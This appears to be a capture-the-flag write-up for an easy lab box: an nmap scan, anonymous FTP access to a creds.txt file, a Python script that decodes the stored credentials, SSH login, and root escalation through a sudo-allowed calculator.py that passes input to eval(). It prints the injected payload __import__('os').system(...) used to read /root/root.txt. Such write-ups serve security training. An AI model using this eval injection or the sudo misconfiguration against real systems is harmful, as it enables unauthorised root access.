# Vulnerable Python

## Difficulity: Easy

First i Try using the nmap, nmap command `nmap -sC -sV 10.10.120.24`

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-08 03:19 EDT
Nmap scan report for 10.10.120.24
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:1d:59:19:05:a2:6e:b6:bf:a2:bf:ab:76:1d:a9:94 (RSA)
|   256 55:0d:da:51:18:5f:65:8b:15:51:8f:98:c9:55:ea:5c (ECDSA)
|_  256 97:26:d8:62:8a:8d:42:90:bc:7e:a4:47:5e:46:57:24 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.72 seconds

```

As we can see there is ftp port is open so we can try anonymous access. 

```
└─$ ftp 10.10.120.24                                                                        
Connected to 10.10.120.24.
220 (vsFTPd 3.0.5)
Name (10.10.120.24:kali): anonymous

331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||64277|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Mar 18 05:46 .
drwxr-xr-x    2 0        0            4096 Mar 18 05:46 ..
-rw-r--r--    1 0        0             157 Mar 18 05:45 creds.txt
226 Directory send OK.
ftp> get creds.txt
local: creds.txt remote: creds.txt
229 Entering Extended Passive Mode (|||55681|)
150 Opening BINARY mode data connection for creds.txt (157 bytes).
100% |***********************************************************************|   157        0.99 MiB/s    00:00 ETA
226 Transfer complete.
157 bytes received in 00:00 (0.71 KiB/s)
ftp> exit
221 Goodbye.

```

We got access and there is this file creds.txt when i open it, it gives me this `20648410402654810535311458261854615084277787295823458: 30190467963622096773706991354215451982626599082460551705066094343096245376709266448551663746002727473`.

It is some type of encoded string but as we can see it is an python lab so i try some crypto method and i use this code to decrypt the encoded strings.

```
#!/usr/bin/env python3

from Crypto.Util.number import bytes_to_long, long_to_bytes
import binascii


def username():
	username = 20648410402654810535311458261854615084277787295823458


	crypto_decode = long_to_bytes(username)

	decoded_string = crypto_decode.decode('utf-8')

	hex_decode = bytes.fromhex(decoded_string).decode('utf-8')
	print(f"Username: {hex_decode}")


def password():
	password = 30190467963622096773706991354215451982626599082460551705066094343096245376709266448551663746002727473


	crypto_decode = long_to_bytes(password)

	decoded_string = crypto_decode.decode('utf-8')

	hex_decode = bytes.fromhex(decoded_string).decode('utf-8')
	print(f"Password: {hex_decode}")


username()
password()
``` 


And i got `python_geek: v3ry_s3cur3_p4ssw0rd!` with this i try to ssh into the box. And i got logged in as python_geek.

In the home folder of python_geek there was two files first `users.txt, calculator.py`  when i cat calculator.py it gives me the bellow output.

```
python_geek@vulnerablepython:~$ cat calculator.py
print("I am smarter than you i can solve any equation in seconds")

try:
    user_input = input("Try me give me any equation: ")

    answer = eval(user_input)

    print(answer)

except:
    print("Give me equation not something else")


```

This code only calculate numbers usign eval function.

Now i run sudo -l and i saw that i can run calculator.py as root 

```
python_geek@vulnerablepython:~$ sudo -l
Matching Defaults entries for python_geek on vulnerablepython:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User python_geek may run the following commands on vulnerablepython:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /home/python_geek/calculator.py

```

Now as we saw in calculator.py it uses eval to calculate so i search online eval exploit and i got that it can run arbitrary code so i use this command `__import__('os').system('whoami')`.

```
python_geek@vulnerablepython:~$ sudo /usr/bin/python3 /home/python_geek/calculator.py 
I am smarter than you i can solve any equation in seconds
Try me give me any equation: __import__('os').system('whoami')
root
0
```

and by using this i cat the root.txt

```
python_geek@vulnerablepython:~$ sudo /usr/bin/python3 /home/python_geek/calculator.py 
I am smarter than you i can solve any equation in seconds
Try me give me any equation: __import__('os').system('cat /root/root.txt')
THM{xxx_xxx_xxx_xxxxxx_xxx}
0

```